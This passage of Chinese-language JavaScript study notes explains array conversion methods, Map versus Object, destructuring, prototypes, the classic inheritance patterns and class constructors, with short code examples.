<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
<li>
<p>数组索引。</p>
<blockquote>
<p>数组最多可以包含 4 294 967 295 个元素（<span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:0.8974em;vertical-align:-0.0833em;"></span><span><span>2</span><span><span><span><span style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span>32</span></span></span></span></span></span></span></span></span><span style="margin-right:0.2222em;"></span><span>−</span><span style="margin-right:0.2222em;"></span></span><span><span style="height:0.6444em;"></span><span>1</span></span></span></span>），这对于大多数编程任务应该足够了。如果尝试添加更多项，则会导致抛出错误。以这个最大值作为初始值创建数组，可能导致脚本运行时间过长的错误。</p>
</blockquote>
</li>
<li>
<p>转换方法。</p>
<blockquote>
<p>toLocaleString() 方法也可能返回跟 toString() 和 valueOf() 相同的结果，但也不一定。在调用数组的 toLocaleString() 方法时，会得到一个逗号分隔的数组值的字符串。它与另外两个方法唯一的区别是，为了得到最终的字符串，会调用数组每个值的 toLocaleString() 方法，而不是 toString() 方法。</p>
</blockquote>
<div><pre><code><span>let</span> person1 <span>=</span> <span>{</span>
  <span>toLocaleString</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>'Nikolaos'</span>
  <span>}</span><span>,</span>
  <span>toString</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>'Nicholas'</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>let</span> person2 <span>=</span> <span>{</span>
  <span>toLocaleString</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>'Grigorios'</span>
  <span>}</span><span>,</span>
  <span>toString</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>'Greg'</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>let</span> people <span>=</span> <span>[</span>person1<span>,</span> person2<span>]</span>
<span>alert</span><span>(</span>people<span>)</span> <span>// Nicholas,Greg</span>
<span>alert</span><span>(</span>people<span>.</span><span>toString</span><span>(</span><span>)</span><span>)</span> <span>// Nicholas,Greg</span>
<span>alert</span><span>(</span>people<span>.</span><span>toLocaleString</span><span>(</span><span>)</span><span>)</span> <span>// Nikolaos,Grigorios</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><blockquote>
<p>如果数组中某一项是 null 或 undefined，则在 join() 、toLocaleString() 、toString() 和 valueOf() 返回的结果中会以空字符串表示。</p>
</blockquote>
</li>
<li>
<p>搜索和位置方法。</p>
<blockquote>
<p>如果 slice() 的参数有负值，那么就以数值长度加上这个负值的结果确定位置。比如，在包含 5 个元素的数组上调用 slice(-2,-1) ，就相当于调用 slice(3,4) 。如果结束位置小于开始位置，则返回空数组。</p>
</blockquote>
</li>
</ul>
<h2 id="_8-map"> 8. Map</h2>
<ul>
<li>
<p>与 Object 类型的一个主要差异是， Map 实例会维护键值对的插入顺序，因此可以根据插入顺序执行迭代操作（Set 具有相同性质）。</p>
</li>
<li>
<p>对于多数 Web 开发任务来说，选择 Object 还是 Map 只是个人偏好问题，影响不大。不过，对于在乎内存和性能的开发者来说，对象和映射之间确实存在显著的差别。</p>
<blockquote>
<ul>
<li>内存占用：批量添加或删除键/值对则取决于各浏览器对该类型内存分配的工程实现。不同浏览器的情况不同，但给定固定大小的内存， Map 大约可以比 Object 多存储 50%的键/值对。</li>
<li>插入性能：如果代码涉及大量插入操作，那么显然 Map 的性能更佳。</li>
<li>查找速度：如果代码涉及大量查找操作，那么某些情况下可能选择 Object 更好一些。</li>
<li>删除性能：对大多数浏览器引擎来说， Map 的 delete() 操作都比插入和查找更快。如果代码涉及大量删除操作，那么毫无疑问应该选择 Map。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_9-迭代器与生成器"> 9. 迭代器与生成器</h2>
<ul>
<li>
<p>迭代器维护着一个指向可迭代对象的引用，因此迭代器会阻止垃圾回收程序回收可迭代对象。</p>
</li>
<li>
<p>箭头函数不能用来定义生成器函数。</p>
</li>
</ul>
<h2 id="_10-增强的对象语法"> 10. 增强的对象语法</h2>
<ul>
<li>
<p>属性值简写。</p>
<blockquote>
<p>在这里，即使参数标识符只限定于函数作用域，编译器也会保留初始的 name 标识符。如果使用 Google Closure 编译器压缩，那么函数参数会被缩短，而属性名不变。</p>
</blockquote>
<div><pre><code><span>// 属性简写</span>
<span>function</span> <span>makePerson</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>return</span> <span>{</span>
    name<span>,</span>
  <span>}</span>
<span>}</span>

<span>let</span> person <span>=</span> <span>makePerson</span><span>(</span><span>'Matt'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>person<span>.</span>name<span>)</span> <span>// Matt</span>

<span>// 压缩示意</span>
<span>function</span> <span>makePerson</span><span>(</span><span>a</span><span>)</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>name</span><span>:</span> a<span>,</span>
  <span>}</span>
<span>}</span>

<span>var</span> person <span>=</span> <span>makePerson</span><span>(</span><span>'Matt'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>person<span>.</span>name<span>)</span> <span>// Matt</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div></li>
</ul>
<h2 id="_11-对象解构"> 11. 对象解构</h2>
<ul>
<li>解构并不要求变量必须在解构表达式中声明。不过，如果是给事先声明的变量赋值，则赋值表达式必须包含在一对括号中。</li>
</ul>
<div><pre><code><span>let</span> personName<span>,</span> personAge
<span>let</span> person <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'Matt'</span><span>,</span>
  <span>age</span><span>:</span> <span>27</span><span>,</span>
<span>}</span>

<span>;</span><span>(</span><span>{</span> <span>name</span><span>:</span> personName<span>,</span> <span>age</span><span>:</span> personAge <span>}</span> <span>=</span> person<span>)</span>

console<span>.</span><span>log</span><span>(</span>personName<span>,</span> personAge<span>)</span> <span>// Matt, 27</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><ul>
<li>
<p>嵌套解构。</p>
<blockquote>
<p>解构对于引用嵌套的属性或赋值目标没有限制。为此，可以通过解构来复制对象属性。</p>
</blockquote>
<div><pre><code><span>let</span> person <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'Matt'</span><span>,</span>
  <span>age</span><span>:</span> <span>27</span><span>,</span>
  <span>job</span><span>:</span> <span>{</span>
    <span>title</span><span>:</span> <span>'Software engineer'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>let</span> personCopy <span>=</span> <span>{</span><span>}</span>

<span>;</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> personCopy<span>.</span>name<span>,</span>
  <span>age</span><span>:</span> personCopy<span>.</span>age<span>,</span>
  <span>job</span><span>:</span> personCopy<span>.</span>job<span>,</span>
<span>}</span> <span>=</span> person<span>)</span>
<span>// 因为一个对象的引用被赋值给 personCopy，所以修改</span>
<span>// person.job 对象的属性也会影响 personCopy</span>
person<span>.</span>job<span>.</span>title <span>=</span> <span>'Hacker'</span>
console<span>.</span><span>log</span><span>(</span>person<span>)</span>
<span>// { name: 'Matt', age: 27, job: { title: 'Hacker' } }</span>
console<span>.</span><span>log</span><span>(</span>personCopy<span>)</span>
<span>// { name: 'Matt', age: 27, job: { title: 'Hacker' } }</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div></li>
</ul>
<h2 id="_12-原型模式"> 12. 原型模式</h2>
<ul>
<li>
<p>Object.setPrototypeOf() 可能会严重影响代码性能。Mozilla 文档说得很清楚：“在所有浏览器和 JavaScript 引擎中，修改继承关系的影响都是微妙且深远的。这种影响并不仅是执行 Object.setPrototypeOf() 语句那么简单，而是会涉及所有访问了那些修改过 [[Prototype]] 的对象的代码”</p>
</li>
<li>
<p>为避免使用 Object.setPrototypeOf() 可能造成的性能下降，可以通过 Object.create() 来创建一个新对象，同时为其指定原型。</p>
</li>
</ul>
<div><pre><code><span>// Object.setPrototypeOf()</span>
<span>let</span> biped <span>=</span> <span>{</span>
  <span>numLegs</span><span>:</span> <span>2</span><span>,</span>
<span>}</span>

<span>let</span> person <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'Matt'</span><span>,</span>
<span>}</span>

Object<span>.</span><span>setPrototypeOf</span><span>(</span>person<span>,</span> biped<span>)</span>

console<span>.</span><span>log</span><span>(</span>person<span>.</span>name<span>)</span> <span>// Matt</span>
console<span>.</span><span>log</span><span>(</span>person<span>.</span>numLegs<span>)</span> <span>// 2</span>
console<span>.</span><span>log</span><span>(</span>Object<span>.</span><span>getPrototypeOf</span><span>(</span>person<span>)</span> <span>===</span> biped<span>)</span> <span>// true</span>

<span>// Object.create()</span>
<span>let</span> biped <span>=</span> <span>{</span>
  <span>numLegs</span><span>:</span> <span>2</span><span>,</span>
<span>}</span>

<span>let</span> person <span>=</span> Object<span>.</span><span>create</span><span>(</span>biped<span>)</span>

person<span>.</span>name <span>=</span> <span>'Matt'</span>
console<span>.</span><span>log</span><span>(</span>person<span>.</span>name<span>)</span> <span>// Matt</span>
console<span>.</span><span>log</span><span>(</span>person<span>.</span>numLegs<span>)</span> <span>// 2</span>
console<span>.</span><span>log</span><span>(</span>Object<span>.</span><span>getPrototypeOf</span><span>(</span>person<span>)</span> <span>===</span> biped<span>)</span> <span>// true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div><ul>
<li>for-in 循环和 Object.keys()的枚举顺序是不确定的，取决于 JavaScript 引擎，可能因浏览器而异。</li>
</ul>
<h2 id="_13-对象迭代"> 13. 对象迭代</h2>
<ul>
<li>重写构造函数上的原型之后再创建的实例才会引用新的原型，而在此之前创建的实例仍然会引用最初的原型。</li>
</ul>
<div><pre><code><span>function</span> <span>Person</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>let</span> friend <span>=</span> <span>new</span> <span>Person</span><span>(</span><span>)</span>

<span>Person</span><span>.</span>prototype <span>=</span> <span>{</span>
  <span>constructor</span><span>:</span> Person<span>,</span>
  <span>name</span><span>:</span> <span>'Nicholas'</span><span>,</span>
  <span>age</span><span>:</span> <span>29</span><span>,</span>
  <span>job</span><span>:</span> <span>'Software Engineer'</span><span>,</span>
  <span>sayName</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name<span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

friend<span>.</span><span>sayName</span><span>(</span><span>)</span> <span>// 错误</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h2 id="_14-继承"> 14. 继承</h2>
<ul>
<li>
<p>原型链。</p>
<blockquote>
<ul>
<li>原型链虽然是实现继承的强大工具，但它也有问题。主要问题出现在原型中包含引用值的时候。</li>
<li>原型链的第二个问题是，子类型在实例化时不能给父类型的构造函数传参。事实上，我们无法在不影响所有对象实例的情况下把参数传进父类的构造函数。再加上之前提到的原型中包含引用值的问题，就导致原型链基本不会被单独使用。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>SuperType</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>colors <span>=</span> <span>[</span><span>'red'</span><span>,</span> <span>'blue'</span><span>,</span> <span>'green'</span><span>]</span>
<span>}</span>
<span>function</span> <span>SubType</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>// 继承 SuperType</span>
<span>SubType</span><span>.</span>prototype <span>=</span> <span>new</span> <span>SuperType</span><span>(</span><span>)</span>

<span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span>
instance1<span>.</span>colors<span>.</span><span>push</span><span>(</span><span>'black'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>colors<span>)</span> <span>// "red,blue,green,black"</span>

<span>let</span> instance2 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>instance2<span>.</span>colors<span>)</span> <span>// "red,blue,green,black"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div></li>
<li>
<p>盗用构造函数。</p>
<blockquote>
<ul>
<li>在子类构造函数中调用父类构造函数。因为毕竟函数就是在特定上下文中执行代码的简单对象，所以可以使用 apply() 和 call() 方法以新创建的对象为上下文执行构造函数。</li>
<li>盗用构造函数的主要缺点，也是使用构造函数模式自定义类型的问题：必须在构造函数中定义方法，因此函数不能重用。此外，子类也不能访问父类原型上定义的方法，因此所有类型只能使用构造函数模式。由于存在这些问题，盗用构造函数基本上也不能单独使用</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>SuperType</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>colors <span>=</span> <span>[</span><span>'red'</span><span>,</span> <span>'blue'</span><span>,</span> <span>'green'</span><span>]</span>
<span>}</span>

<span>function</span> <span>SubType</span><span>(</span><span>)</span> <span>{</span>
  <span>// 继承 SuperType</span>
  <span>SuperType</span><span>.</span><span>call</span><span>(</span><span>this</span><span>)</span>
<span>}</span>

<span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span>
instance1<span>.</span>colors<span>.</span><span>push</span><span>(</span><span>'black'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>colors<span>)</span> <span>// "red,blue,green,black"</span>

<span>let</span> instance2 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>instance2<span>.</span>colors<span>)</span> <span>// "red,blue,green"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div></li>
<li>
<p>组合继承。</p>
<blockquote>
<ul>
<li>组合继承（有时候也叫伪经典继承）综合了原型链和盗用构造函数，将两者的优点集中了起来。基本的思路是使用原型链继承原型上的属性和方法，而通过盗用构造函数继承实例属性。这样既可以把方法定义在原型上以实现重用，又可以让每个实例都有自己的属性。</li>
<li>组合继承弥补了原型链和盗用构造函数的不足，是 JavaScript 中使用最多的继承模式。而且组合继承也保留了 instanceof 操作符和 isPrototypeOf() 方法识别合成对象的能力。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>SuperType</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
  <span>this</span><span>.</span>colors <span>=</span> <span>[</span><span>'red'</span><span>,</span> <span>'blue'</span><span>,</span> <span>'green'</span><span>]</span>
<span>}</span>

<span>SuperType</span><span>.</span>prototype<span>.</span><span>sayName</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name<span>)</span>
<span>}</span>

<span>function</span> <span>SubType</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
  <span>// 继承属性</span>
  <span>SuperType</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> name<span>)</span>
  <span>this</span><span>.</span>age <span>=</span> age
<span>}</span>

<span>// 继承方法</span>
<span>SubType</span><span>.</span>prototype <span>=</span> <span>new</span> <span>SuperType</span><span>(</span><span>)</span>
<span>SubType</span><span>.</span>prototype<span>.</span><span>sayAge</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>age<span>)</span>
<span>}</span>

<span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>'Nicholas'</span><span>,</span> <span>29</span><span>)</span>
instance1<span>.</span>colors<span>.</span><span>push</span><span>(</span><span>'black'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>colors<span>)</span> <span>// "red,blue,green,black"</span>
instance1<span>.</span><span>sayName</span><span>(</span><span>)</span> <span>// "Nicholas";</span>
instance1<span>.</span><span>sayAge</span><span>(</span><span>)</span> <span>// 29</span>

<span>let</span> instance2 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>'Greg'</span><span>,</span> <span>27</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>instance2<span>.</span>colors<span>)</span> <span>// "red,blue,green"</span>
instance2<span>.</span><span>sayName</span><span>(</span><span>)</span> <span>// "Greg";</span>
instance2<span>.</span><span>sayAge</span><span>(</span><span>)</span> <span>// 27</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br></div></div></li>
<li>
<p>原型式继承。</p>
<blockquote>
<ul>
<li>2006 年，Douglas Crockford 写了一篇文章：<a href="https://www.crockford.com/javascript/prototypal.html" target="_blank" rel="noopener noreferrer">《JavaScript 中的原型式继承》</a>（“Prototypal Inheritance inJavaScript”）。这篇文章介绍了一种不涉及严格意义上构造函数的继承方法。他的出发点是即使不自定义类型也可以通过原型实现对象之间的信息共享。</li>
<li>这个 object() 函数会创建一个临时构造函数，将传入的对象赋值给这个构造函数的原型，然后返回这个临时类型的一个实例。本质上， object() 是对传入的对象执行了一次浅复制。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>object</span><span>(</span><span>o</span><span>)</span> <span>{</span>
  <span>function</span> <span>F</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>F</span><span>.</span>prototype <span>=</span> o
  <span>return</span> <span>new</span> <span>F</span><span>(</span><span>)</span>
<span>}</span>

<span>let</span> person <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'Nicholas'</span><span>,</span>
  <span>friends</span><span>:</span> <span>[</span><span>'Shelby'</span><span>,</span> <span>'Court'</span><span>,</span> <span>'Van'</span><span>]</span><span>,</span>
<span>}</span>

<span>let</span> anotherPerson <span>=</span> <span>object</span><span>(</span>person<span>)</span>
anotherPerson<span>.</span>name <span>=</span> <span>'Greg'</span>
anotherPerson<span>.</span>friends<span>.</span><span>push</span><span>(</span><span>'Rob'</span><span>)</span>

<span>let</span> yetAnotherPerson <span>=</span> <span>object</span><span>(</span>person<span>)</span>
yetAnotherPerson<span>.</span>name <span>=</span> <span>'Linda'</span>
yetAnotherPerson<span>.</span>friends<span>.</span><span>push</span><span>(</span><span>'Barbie'</span><span>)</span>

console<span>.</span><span>log</span><span>(</span>person<span>.</span>friends<span>)</span> <span>// "Shelby,Court,Van,Rob,Barbie"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><blockquote>
<p>ECMAScript 5 通过增加 Object.create() 方法将原型式继承的概念规范化了。</p>
</blockquote>
<div><pre><code><span>let</span> person <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'Nicholas'</span><span>,</span>
  <span>friends</span><span>:</span> <span>[</span><span>'Shelby'</span><span>,</span> <span>'Court'</span><span>,</span> <span>'Van'</span><span>]</span><span>,</span>
<span>}</span>

<span>let</span> anotherPerson <span>=</span> Object<span>.</span><span>create</span><span>(</span>person<span>)</span>
anotherPerson<span>.</span>name <span>=</span> <span>'Greg'</span>
anotherPerson<span>.</span>friends<span>.</span><span>push</span><span>(</span><span>'Rob'</span><span>)</span>

<span>let</span> yetAnotherPerson <span>=</span> Object<span>.</span><span>create</span><span>(</span>person<span>)</span>
yetAnotherPerson<span>.</span>name <span>=</span> <span>'Linda'</span>
yetAnotherPerson<span>.</span>friends<span>.</span><span>push</span><span>(</span><span>'Barbie'</span><span>)</span>

console<span>.</span><span>log</span><span>(</span>person<span>.</span>friends<span>)</span> <span>// "Shelby,Court,Van,Rob,Barbie"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div></li>
<li>
<p>寄生式继承。</p>
<blockquote>
<ul>
<li>与原型式继承比较接近的一种继承方式是寄生式继承（parasitic inheritance），也是 Crockford 首倡的一种模式。寄生式继承背后的思路类似于寄生构造函数和工厂模式：创建一个实现继承的函数，以某种方式增强对象，然后返回这个对象。</li>
<li>寄生式继承同样适合主要关注对象，而不在乎类型和构造函数的场景。object() 函数不是寄生式继承所必需的，任何返回新对象的函数都可以在这里使用。</li>
<li>通过寄生式继承给对象添加函数会导致函数难以重用，与构造函数模式类似。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>object</span><span>(</span><span>o</span><span>)</span> <span>{</span>
  <span>function</span> <span>F</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>F</span><span>.</span>prototype <span>=</span> o
  <span>return</span> <span>new</span> <span>F</span><span>(</span><span>)</span>
<span>}</span>

<span>function</span> <span>createAnother</span><span>(</span><span>original</span><span>)</span> <span>{</span>
  <span>let</span> clone <span>=</span> <span>object</span><span>(</span>original<span>)</span> <span>// 通过调用函数创建一个新对象</span>
  <span>// 以某种方式增强这个对象</span>
  clone<span>.</span><span>sayHi</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'hi'</span><span>)</span>
  <span>}</span>
  <span>return</span> clone <span>// 返回这个对象</span>
<span>}</span>

<span>let</span> person <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'Nicholas'</span><span>,</span>
  <span>friends</span><span>:</span> <span>[</span><span>'Shelby'</span><span>,</span> <span>'Court'</span><span>,</span> <span>'Van'</span><span>]</span><span>,</span>
<span>}</span>

<span>let</span> anotherPerson <span>=</span> <span>createAnother</span><span>(</span>person<span>)</span>
anotherPerson<span>.</span><span>sayHi</span><span>(</span><span>)</span> <span>// "hi"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div></li>
<li>
<p>寄生式组合继承。</p>
<blockquote>
<ul>
<li>组合继承其实也存在效率问题。最主要的效率问题就是父类构造函数始终会被调用两次：一次在是创建子类原型时调用，另一次是在子类构造函数中调用。本质上，子类原型最终是要包含超类对象的所有实例属性，子类构造函数只要在执行时重写自己的原型就行了。</li>
<li>寄生式组合继承通过盗用构造函数继承属性，但使用混合式原型链继承方法。基本思路是不通过调用父类构造函数给子类原型赋值，而是取得父类原型的一个副本。说到底就是使用寄生式继承来继承父类原型，然后将返回的新对象赋值给子类原型。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>inheritPrototype</span><span>(</span><span>subType<span>,</span> superType</span><span>)</span> <span>{</span>
  <span>let</span> prototype <span>=</span> <span>object</span><span>(</span>superType<span>.</span>prototype<span>)</span> <span>// 创建对象</span>
  prototype<span>.</span>constructor <span>=</span> subType <span>// 增强对象</span>
  subType<span>.</span>prototype <span>=</span> prototype <span>// 赋值对象</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><blockquote>
<ul>
<li>这个 inheritPrototype() 函数实现了寄生式组合继承的核心逻辑。这个函数接收两个参数：子类构造函数和父类构造函数。在这个函数内部，第一步是创建父类原型的一个副本。然后，给返回的 prototype 对象设置 constructor 属性，解决由于重写原型导致默认 constructor 丢失的问题。最后将新创建的对象赋值给子类型的原型。</li>
<li>这里只调用了一次 SuperType 构造函数，避免了 SubType.prototype 上不必要也用不到的属性，因此可以说这个例子的效率更高。而且，原型链仍然保持不变，因此 instanceof 操作符和 isPrototypeOf() 方法正常有效。寄生式组合继承可以算是引用类型继承的最佳模式。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>object</span><span>(</span><span>o</span><span>)</span> <span>{</span>
  <span>function</span> <span>F</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>F</span><span>.</span>prototype <span>=</span> o
  <span>return</span> <span>new</span> <span>F</span><span>(</span><span>)</span>
<span>}</span>

<span>function</span> <span>inheritPrototype</span><span>(</span><span>subType<span>,</span> superType</span><span>)</span> <span>{</span>
  <span>let</span> prototype <span>=</span> <span>object</span><span>(</span>superType<span>.</span>prototype<span>)</span> <span>// 创建对象</span>
  prototype<span>.</span>constructor <span>=</span> subType <span>// 增强对象</span>
  subType<span>.</span>prototype <span>=</span> prototype <span>// 赋值对象</span>
<span>}</span>

<span>function</span> <span>SuperType</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
  <span>this</span><span>.</span>colors <span>=</span> <span>[</span><span>'red'</span><span>,</span> <span>'blue'</span><span>,</span> <span>'green'</span><span>]</span>
<span>}</span>

<span>SuperType</span><span>.</span>prototype<span>.</span><span>sayName</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name<span>)</span>
<span>}</span>

<span>function</span> <span>SubType</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
  <span>SuperType</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> name<span>)</span>
  <span>this</span><span>.</span>age <span>=</span> age
<span>}</span>

<span>inheritPrototype</span><span>(</span>SubType<span>,</span> SuperType<span>)</span>
<span>SubType</span><span>.</span>prototype<span>.</span><span>sayAge</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>age<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div></li>
</ul>
<h2 id="_15-类"> 15. 类</h2>
<ul>
<li>
<p>类构造函数。</p>
<blockquote>
<p>类构造函数与构造函数的主要区别是，调用类构造函数必须使用 new 操作符。而普通构造函数如果不使用 new 调用，那么就会以全局的 this （通常是 window ）作为内部对象。调用类构造函数时如果忘了使用 new 则会抛出错误。</p>
</blockquote>
<div><pre><code><span>function</span> <span>Person</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>class</span> <span>Animal</span> <span>{</span><span>}</span>

<span>// 把 window 作为 this 来构建实例</span>
<span>let</span> p <span>=</span> <span>Person</span><span>(</span><span>)</span>

<span>let</span> a <span>=</span> <span>Animal</span><span>(</span><span>)</span>
<span>// TypeError: class constructor Animal cannot be invoked without 'new'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><blockquote>
<p>与立即调用函数表达式相似，类也可以立即实例化。</p>
</blockquote>
<div><pre><code><span>// 因为是一个类表达式，所以类名是可选的</span>
